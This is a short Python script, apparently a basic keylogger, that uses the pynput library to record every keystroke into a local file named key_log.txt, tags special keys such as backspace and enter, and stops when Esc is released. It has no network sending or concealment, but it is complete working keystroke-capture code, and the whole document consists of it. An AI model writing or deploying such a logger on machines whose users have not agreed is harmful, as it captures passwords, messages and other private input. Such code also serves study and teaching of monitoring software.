from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_to_file(keys)
    keys = []

def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            if isinstance(key, Key):
                if key == Key.space:
                    f.write(" ")
                elif key == Key.enter:
                    f.write("\n")
                elif key == Key.backspace:
                    f.write(" [BACKSPACE] ")
                elif key == Key.esc:
                    f.write(" [ESC] ")
                else:
                    f.write(f" [{str(key)}] ")
            else:
                f.write(key.char)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()